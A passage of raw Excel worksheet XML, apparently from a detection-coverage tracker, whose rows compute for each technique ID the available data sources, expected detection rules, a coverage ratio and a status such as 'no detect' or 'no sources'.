        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S61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11" t="s">
        <v>2513</v>
      </c>
      <c r="U611" t="s">
        <v>2798</v>
      </c>
      <c r="W611" t="b">
        <v>1</v>
      </c>
      <c r="X611" t="s">
        <v>2782</v>
      </c>
    </row>
    <row r="612" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A612" t="s">
        <v>2799</v>
      </c>
      <c r="B612" t="s">
        <v>2799</v>
      </c>
      <c r="C612" t="s">
        <v>195</v>
      </c>
      <c r="D612" t="s">
        <v>6</v>
      </c>
      <c r="E612" t="s">
        <v>940</v>
      </c>
      <c r="F612" s="9">
        <f t="shared" si="9"/>
        <v>2</v>
      </c>
      <c r="G612" s="9" cm="1">
        <f t="array" ref="G612">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H612" s="9" cm="1">
        <f t="array" ref="H612">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>1</v>
      </c>
      <c r="I612" s="9" t="str" cm="1">
        <f t="array" ref="I612">IF(SUM(IF($C612=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C612=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J612" s="9" cm="1">
        <f t="array" ref="J61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612" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M612" s="9" cm="1">
        <f t="array" ref="M612">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N612" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O612" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P612" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S61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12" t="s">
        <v>861</v>
      </c>
      <c r="U612" t="s">
        <v>2800</v>
      </c>
      <c r="V612" t="s">
        <v>2801</v>
      </c>
      <c r="W612" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="613" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A613" t="s">
        <v>2799</v>
      </c>
      <c r="B613" t="s">
        <v>2802</v>
      </c>
      <c r="C613" t="s">
        <v>2803</v>
      </c>
      <c r="D613" t="s">
        <v>6</v>
      </c>
      <c r="E613" t="s">
        <v>940</v>
      </c>
      <c r="F613" s="9">
        <f t="shared" si="9"/>
        <v>2</v>
      </c>
      <c r="G613" s="9" cm="1">
        <f t="array" ref="G613">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H613" s="9" t="str" cm="1">
        <f t="array" ref="H613">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I613" s="9" t="str" cm="1">
        <f t="array" ref="I613">IF(SUM(IF($C613=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C613=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J613" s="9" t="str" cm="1">
        <f t="array" ref="J61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13" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M613" s="9" cm="1">
        <f t="array" ref="M613">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N613" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O613" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P613" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S61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13" t="s">
        <v>861</v>
      </c>
      <c r="U613" t="s">
        <v>2804</v>
      </c>
      <c r="V613" t="s">
        <v>2805</v>
      </c>
      <c r="W613" t="b">
        <v>1</v>
      </c>
      <c r="X613" t="s">
        <v>2799</v>
      </c>
    </row>
    <row r="614" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A614" t="s">
        <v>2806</v>
      </c>
      <c r="B614" t="s">
        <v>2806</v>
      </c>
      <c r="C614" t="s">
        <v>215</v>
      </c>
      <c r="D614" t="s">
        <v>6</v>
      </c>
      <c r="E614" t="s">
        <v>777</v>
      </c>
      <c r="F614" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G614" s="9" cm="1">
        <f t="array" ref="G614">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H614" s="9" cm="1">
        <f t="array" ref="H614">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I614" s="9" t="str" cm="1">
        <f t="array" ref="I614">IF(SUM(IF($C614=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C614=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J614" s="9" cm="1">
        <f t="array" ref="J61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614" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M614" s="9" cm="1">
        <f t="array" ref="M614">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N614" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O614" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P614" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S61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14" t="s">
        <v>861</v>
      </c>
      <c r="U614" t="s">
        <v>2807</v>
      </c>
      <c r="V614" t="s">
        <v>2808</v>
      </c>
      <c r="W614" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="615" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A615" t="s">
        <v>2806</v>
      </c>
      <c r="B615" t="s">
        <v>2809</v>
      </c>
      <c r="C615" t="s">
        <v>2810</v>
      </c>
      <c r="D615" t="s">
        <v>6</v>
      </c>
      <c r="E615" t="s">
        <v>777</v>
      </c>
      <c r="F615" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G615" s="9" cm="1">
        <f t="array" ref="G615">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H615" s="9" t="str" cm="1">
        <f t="array" ref="H615">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I615" s="9" t="str" cm="1">
        <f t="array" ref="I615">IF(SUM(IF($C615=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C615=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J615" s="9" t="str" cm="1">
        <f t="array" ref="J61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15" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M615" s="9" cm="1">
        <f t="array" ref="M615">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N615" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O615" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P615" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S61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15" t="s">
        <v>861</v>
      </c>
      <c r="U615" t="s">
        <v>2811</v>
      </c>
      <c r="V615" t="s">
        <v>2812</v>
      </c>
      <c r="W615" t="b">
        <v>1</v>
      </c>
      <c r="X615" t="s">
        <v>2806</v>
      </c>
    </row>
    <row r="616" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A616" t="s">
        <v>2806</v>
      </c>
      <c r="B616" t="s">
        <v>2813</v>
      </c>
      <c r="C616" t="s">
        <v>2814</v>
      </c>
      <c r="D616" t="s">
        <v>6</v>
      </c>
      <c r="E616" t="s">
        <v>777</v>
      </c>
      <c r="F616" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G616" s="9" cm="1">
        <f t="array" ref="G616">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H616" s="9" t="str" cm="1">
        <f t="array" ref="H616">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I616" s="9" t="str" cm="1">
        <f t="array" ref="I616">IF(SUM(IF($C616=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C616=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J616" s="9" t="str" cm="1">
        <f t="array" ref="J61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16" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M616" s="9" cm="1">
        <f t="array" ref="M616">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N616" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O616" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P616" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S61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16" t="s">
        <v>861</v>
      </c>
      <c r="U616" t="s">
        <v>2815</v>
      </c>
      <c r="V616" t="s">
        <v>2816</v>
      </c>
      <c r="W616" t="b">
        <v>1</v>
      </c>
      <c r="X616" t="s">
        <v>2806</v>
      </c>
    </row>
    <row r="617" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A617" t="s">
        <v>2817</v>
      </c>
      <c r="B617" t="s">
        <v>2817</v>
      </c>
      <c r="C617" t="s">
        <v>193</v>
      </c>
      <c r="D617" t="s">
        <v>6</v>
      </c>
      <c r="E617" t="s">
        <v>777</v>
      </c>
      <c r="F617" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G617" s="9" cm="1">
        <f t="array" ref="G617">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H617" s="9" cm="1">
        <f t="array" ref="H617">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I617" s="9" t="str" cm="1">
        <f t="array" ref="I617">IF(SUM(IF($C617=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C617=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J617" s="9" cm="1">
        <f t="array" ref="J61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617" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M617" s="9" cm="1">
        <f t="array" ref="M617">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N617" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O617" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P617" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S61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17" t="s">
        <v>861</v>
      </c>
      <c r="U617" t="s">
        <v>2818</v>
      </c>
      <c r="V617" t="s">
        <v>2819</v>
      </c>
      <c r="W617" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="618" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A618" t="s">
        <v>2817</v>
      </c>
      <c r="B618" t="s">
        <v>2820</v>
      </c>
      <c r="C618" t="s">
        <v>2821</v>
      </c>
      <c r="D618" t="s">
        <v>6</v>
      </c>
      <c r="E618" t="s">
        <v>777</v>
      </c>
      <c r="F618" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G618" s="9" cm="1">
        <f t="array" ref="G618">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H618" s="9" t="str" cm="1">
        <f t="array" ref="H618">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I618" s="9" t="str" cm="1">
        <f t="array" ref="I618">IF(SUM(IF($C618=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C618=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J618" s="9" t="str" cm="1">
        <f t="array" ref="J61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18" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M618" s="9" cm="1">
        <f t="array" ref="M618">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N618" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O618" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P618" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S61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18" t="s">
        <v>861</v>
      </c>
      <c r="U618" t="s">
        <v>2822</v>
      </c>
      <c r="V618" t="s">
        <v>2823</v>
      </c>
      <c r="W618" t="b">
        <v>1</v>
      </c>
      <c r="X618" t="s">
        <v>2817</v>
      </c>
    </row>
    <row r="619" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A619" t="s">
        <v>2817</v>
      </c>
      <c r="B619" t="s">
        <v>2824</v>
      </c>
      <c r="C619" t="s">
        <v>2825</v>
      </c>
      <c r="D619" t="s">
        <v>6</v>
      </c>
      <c r="E619" t="s">
        <v>777</v>
      </c>
      <c r="F619" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G619" s="9" cm="1">
        <f t="array" ref="G619">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H619" s="9" t="str" cm="1">
        <f t="array" ref="H619">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I619" s="9" t="str" cm="1">
        <f t="array" ref="I619">IF(SUM(IF($C619=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C619=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J619" s="9" t="str" cm="1">
        <f t="array" ref="J61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19" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M619" s="9" cm="1">
        <f t="array" ref="M619">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N619" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O619" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P619" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S61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19" t="s">
        <v>861</v>
      </c>
      <c r="U619" t="s">
        <v>2826</v>
      </c>
      <c r="V619" t="s">
        <v>2827</v>
      </c>
      <c r="W619" t="b">
        <v>1</v>
      </c>
      <c r="X619" t="s">
        <v>2817</v>
      </c>
    </row>
    <row r="620" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A620" t="s">
        <v>2828</v>
      </c>
      <c r="B620" t="s">
        <v>2828</v>
      </c>
      <c r="C620" t="s">
        <v>121</v>
      </c>
      <c r="D620" t="s">
        <v>10</v>
      </c>
      <c r="E620" t="s">
        <v>2829</v>
      </c>
      <c r="F620" s="9">
        <f t="shared" si="9"/>
        <v>2</v>
      </c>
      <c r="G620" s="9" cm="1">
        <f t="array" ref="G620">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H620" s="9" cm="1">
        <f t="array" ref="H620">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I620" s="9" t="str" cm="1">
        <f t="array" ref="I620">IF(SUM(IF($C620=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C620=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J620" s="9" cm="1">
        <f t="array" ref="J62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620" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M620" s="9" cm="1">
        <f t="array" ref="M620">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N620" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O620" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P620" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S62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20" t="s">
        <v>861</v>
      </c>
      <c r="U620" t="s">
        <v>2830</v>
      </c>
      <c r="V620" t="s">
        <v>2831</v>
      </c>
      <c r="W620" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="621" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A621" t="s">
        <v>2828</v>
      </c>
      <c r="B621" t="s">
        <v>2832</v>
      </c>
      <c r="C621" t="s">
        <v>2833</v>
      </c>
      <c r="D621" t="s">
        <v>10</v>
      </c>
      <c r="E621" t="s">
        <v>2829</v>
      </c>
      <c r="F621" s="9">
        <f t="shared" si="9"/>
        <v>2</v>
      </c>
      <c r="G621" s="9" cm="1">
        <f t="array" ref="G621">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H621" s="9" t="str" cm="1">
